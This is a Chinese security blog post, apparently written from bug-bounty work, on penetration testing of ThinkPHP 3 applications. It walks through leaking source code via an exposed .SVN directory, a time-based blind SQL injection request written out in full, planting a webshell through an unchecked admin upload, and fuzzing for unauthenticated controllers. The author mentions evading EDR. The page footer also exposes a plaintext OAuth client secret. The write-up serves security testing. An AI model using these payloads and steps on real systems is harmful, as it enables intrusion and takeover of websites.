<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <link rel="icon" href="data:;base64,=">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        leshier&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body id="bodyx">
    
<div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            「渗透测试」- TP3框架下的渗透思路
        </p>
        <hr>
    </div>

    <div class="post-content">
        <h2 id="1-ThinkPHP"><a href="#1-ThinkPHP" class="headerlink" title="1. ThinkPHP"></a>1. ThinkPHP</h2><p><code> ThinkPHP是一个开源免费的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。同时遵循Apache2开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售</code> </p>
<p><code>ThinkPHP (TP)</code> 算是国内主流的一个PHP框架，首先上手快，资料多，学习成本很低，而且也是我第一个接触的MVC框架。</p>
<p>TP主要分为以下几个版本： <code>TP3</code> 、 <code>TP5</code> 、 <code>TP6</code> <br>大可能出现漏洞的范围，或者说常见的漏洞（肯定不全，一般的思路）：</p>
<ul>
<li>TP3<ul>
<li>SQLi</li>
</ul>
</li>
<li>TP5<ul>
<li>RCE</li>
</ul>
</li>
<li>TP6<ul>
<li>任意文件操作</li>
</ul>
</li>
</ul>
<p>由于 <code>TP</code> 是个国内较为主流的框架，在SRC或者众测中经常遇到基于 <code>TP</code>的业务系统，那么接下来，我会以案例讲解我渗透 <code>TP</code> 的思路。</p>
<h3 id="1-1-确定版本"><a href="#1-1-确定版本" class="headerlink" title="1.1 确定版本"></a>1.1 确定版本</h3><p>对于确定版本信息，一般可以在<code>xxx/index.php/index/</code><font color="red"><code>任意字符</code></font> </p>
<p>一般就会出现无法找到控制器的报错信息，就可以确定版本（如果没自定义错误页面的话）。</p>
<p><img src="/2020/12/15/TP3_pentest/image-20201215185802247.png" alt="image-20201215185802247"></p>
<h2 id="2-案例1-SVN-gt-SQLi-gt-GetShell"><a href="#2-案例1-SVN-gt-SQLi-gt-GetShell" class="headerlink" title="2. 案例1- .SVN -&gt; SQLi -&gt; GetShell"></a>2. 案例1- <code>.SVN</code> -&gt; <code>SQLi</code> -&gt; <code>GetShell</code></h2><h3 id="2-1-SVN"><a href="#2-1-SVN" class="headerlink" title="2.1 .SVN"></a>2.1 .SVN</h3><p>在挖掘某<code>SRC</code>时，直接一个登陆界面，简单查看<code>url</code>为： <code>xxxx/index.php/Home/Login</code>  ，初步判定 <code>TP</code> 框架<br>随手加上 <code>.SVN</code>，403 ，稳了。 <code>SVN</code> 泄露，利用：<a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit/">svnexploit/</a> 把源码<code>download</code>下来：</p>
<p><img src="/2020/12/15/TP3_pentest/image-20201215190014711.png" alt="image-20201215190014711"></p>
<p>某些关键字可能与SRC有关，因此隐去。</p>
<blockquote>
<p>├── Application  应用目录（一般前后台两个应用）<br>│   ├── Admin<br>│   │   ├── Action  控制器 （重要）<br>│   │   ├── Common<br>│   │   ├── Conf<br>│   │   ├── Model<br>│   │   ├── View<br>│   │   └── index.html<br>│   ├── Common （公共配置文件）</p>
<p>│   ├── Home</p>
<p>│   │   ├── Action 控制器（重要）</p>
<p>│   │   ├── Common</p>
<p>│   │   ├── Conf</p>
<p>│   │   ├── Model</p>
<p>│   │   ├── View</p>
<p>│   │   └── index.html</p>
<p>│   └── Lib   （库）</p>
<p>├── Public  公开资源，例如js，css，或者上传的image</p>
<p>│   ├── css</p>
<p>│   ├── font-awesome</p>
<p>│   └── js</p>
<p>├── ThinkPHP  TP的程序，只要看到版本就ok</p>
<p>│   ├── Common</p>
<p>│   ├── Conf</p>
<p>│   ├── LICENSE.txt</p>
<p>│   ├── Lang</p>
<p>│   ├── Library</p>
<p>│   ├── Mode</p>
<p>│   ├── ThinkPHP.php</p>
<p>│   ├── Tpl</p>
<p>│   └── logo.png</p>
<p>├── Uploads   在该SRC中，上传存放此处</p>
<p>│   ├── Uploads</p>
<p>│   └── files</p>
<p>├── index.html</p>
<p>├── index.php  入口文件</p>
</blockquote>
<p>其他没写出来的，不是不重要，是我一般不太看（大笑）。</p>
<h3 id="2-2-SQLi"><a href="#2-2-SQLi" class="headerlink" title="2.2  SQLi"></a>2.2  SQLi</h3><p>对于前台的话，我建议先看<code>Home</code>，因为这里的一般不需要登陆，没有鉴权。直接看登陆的方法</p>
<p><img src="/2020/12/15/TP3_pentest/image-20201215190034605.png" alt="image-20201215190034605"></p>
<p>(有一些变量可能和<code>SRC</code>有关，就此用<code>x</code>代替)<br>很明显，<code>x</code> 存在<code>SQLi</code>。</p>
<p><code>payload</code>如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /Home/Login/checkLogin.html HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 152</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">extension=xxx&amp;x[0]=exp&amp;x[1]==(select*from(select+sleep(5)union/**/select+1)a)&amp;password=xxxx</span><br></pre></td></tr></table></figure>
<p>当然<code>sqlmap</code>指定<code>x</code>是跑部出来的，需要对<code>payload</code>做些处理：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 152</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">extension=xxx&amp;x[0]=exp&amp;x[1]==(select from(*)a)&amp;password=xxxx</span><br></pre></td></tr></table></figure>
<p>ok，将一部分转换成<code>*</code>，<code>sqlmap</code>指定，就可以跑出来，如图盲注。<br><img src="/2020/12/15/TP3_pentest/image-20201215190050450.png" alt="image-20201215190050450"></p>
<h3 id="2-3-Getshell"><a href="#2-3-Getshell" class="headerlink" title="2.3 Getshell"></a>2.3 Getshell</h3><p><code>TP</code> 的代码审计，我不想讲太多，对于<code>TP3</code>的话，我的建议是先找敏感函数吧。因为不是专门代码审计的文章，我们<code>SQLi</code>有了，账号密码盲注的话还是太慢了，当然我跑出来了，但是密码无法解出，没关系，我们源码都有了，直接找<code>Getshell</code>的点吧。<br>一般全局查找<code>upload</code>关键字：<br><img src="/2020/12/15/TP3_pentest/image-20201215190104297.png" alt="image-20201215190104297"><br>在这里的时候就发现，Admin应用下存在上传点：<br><img src="/2020/12/15/TP3_pentest/image-20201215190117002.png" alt="image-20201215190117002"><br>这里任意文件上传，已弃用，但是没删掉。<code>黑人问号？？？？</code></p>
<p>注意第三行代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class ManageAction extends BaseAction</span><br></pre></td></tr></table></figure>
<p><code>BaseAction</code> 为权限控制类，那么这个控制器里的方法必须要登陆才可以访问。我们的<code>SQLi</code>虽然解不出来，但是可以插入新的数据，于是我插入了一条管理员的账号，成功登陆。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadPic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] != <span class="number">4</span>) &#123;</span><br><span class="line">           <span class="variable">$image_name</span> = time() . rand(<span class="number">1000</span>, <span class="number">9999</span>) . <span class="string">&quot;.&quot;</span> . end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])); <span class="comment">//图片名称</span></span><br><span class="line">           move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./Uploads/images/login_pic/&#x27;</span> . <span class="variable">$image_name</span>); <span class="comment">//上传图片</span></span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;pic_path&#x27;</span>] = <span class="string">&quot;/Uploads/images/login_pic/&quot;</span> . <span class="variable">$image_name</span>;</span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">           <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = time();</span><br><span class="line">           M(<span class="string">&quot;login_pic&quot;</span>)-&gt;add(<span class="variable">$data</span>);</span><br><span class="line">           <span class="keyword">$this</span>-&gt;success(<span class="string">&quot;上传成功&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;error(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>注意这一句： <code>$image_name = time() . rand(1000, 9999) . &quot;.&quot; . end(explode(&quot;.&quot;, $_FILES[&#39;pic&#39;][&#39;name&#39;])); //图片名称</code> <br>时间加随机数，可以爆破的，但是作为有代码有SQLi的咱们，并不需要那么复杂。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = time();</span><br><span class="line">M(<span class="string">&quot;login_pic&quot;</span>)-&gt;add(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p>他这里有将文件名路径插入数据库的操作，上传shell之后，直接去数据库查询即可。<br><code>Getshell</code>：<br><img src="/2020/12/15/TP3_pentest/image-20201215190132638.png" alt="image-20201215190132638"><br>当然这里还有个小问题，为了照顾新学习tp的童鞋，如何访问控制器里的方法：<br>一般是 <code>xxxxx/index.php/应用名称/控制器名/方法名</code> <br>在这里就是：<br><img src="/2020/12/15/TP3_pentest/image-20201215190150034.png" alt="image-20201215190150034"><br><code>xxx/index.php/Admin/Manage/loginPic</code> 这个路径，当然，具体还是看tp是怎么配置的，一般是这样。在这里师傅们肯定发现，这种情况会有新的fuzz情况产生。<font color="#FF0000"> （在该案例中，由于一getshell之后，没做免杀，立马被<code>src</code>的<code>edr</code>识别拦截，后悔不已。PS：内网漏洞价格比较高）</font>   </p>
<h2 id="3-案例2-Fuzz-TP方法。"><a href="#3-案例2-Fuzz-TP方法。" class="headerlink" title="3. 案例2 Fuzz TP方法。"></a>3. 案例2 Fuzz TP方法。</h2><p><code>xxx/index.php/Admin/Manage/loginPic</code><br>如果后台某些控制器权限控制不严格，可能会有未授权的产生，在这里可以对 <code>loginPic</code> 进行Fuzz。在挖掘某SRC时，就遇到这个情况，也是TP的框架，直接<code>Fuzz</code>方法（或者控制器名称都可）：<br><img src="/2020/12/15/TP3_pentest/image-20201215190422691.png" alt="image-20201215190422691"><br>这里图片没有体现，在当时是<code>fuzz</code>出来一个<code>upload</code>控制器的，简单测试之后直接<code>getshell</code>。<br><img src="/2020/12/15/TP3_pentest/image-20201215190517098.png" alt="image-20201215190517098"></p>
<p><img src="/2020/12/15/TP3_pentest/image-20201215190530409.png" alt="image-20201215190530409"></p>
<h2 id="4-日志泄漏"><a href="#4-日志泄漏" class="headerlink" title="4. 日志泄漏"></a>4. 日志泄漏</h2><p><code>TP</code> 日志泄露<code>http://127.0.0.1/Application/Runtime/Logs/Admin/20_10_28.log</code> <font color="red">(没有找到相关案例)</font></p>
<h2 id="5-结尾"><a href="#5-结尾" class="headerlink" title="5. 结尾"></a>5. 结尾</h2><p>TP3框架的挖掘姿势很多。</p>
<p>以上案例均由我与@v1gle 协作完成。</p>
<p>（首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8417">先知</a>）</p>

    </div>

    <div>
        
    <section>
      <div id="gitalk-container"></div>
    </section>

        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: 'ed09c837cb5a287364c2',
        clientSecret: '772e6894e16520ef6e42a457144c463f11882870',
        repo: 'leshier.github.io',
        owner: 'leshier',
        admin: 'leshier',
        id: location.pathname,      // Ensure uniqueness and length less than 50
        distractionFreeMode: 'false'  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
</script>
    </div>
</div>

    <div class="footer" id="footer">
    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <span id="busuanzi_container_site_pv">Site PV: <span id="busuanzi_value_site_pv"></span></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">Site UV: <span id="busuanzi_value_site_uv"></span></span>
    
    <p>Copyright © 2020 <a class="flink" href="#">Modified Geek by leshier</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
        
    </p>
</div>
<input type="hidden" id="web_style" value="black"> 


<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>


<script src="/js/js.js"></script>


</body>

</html>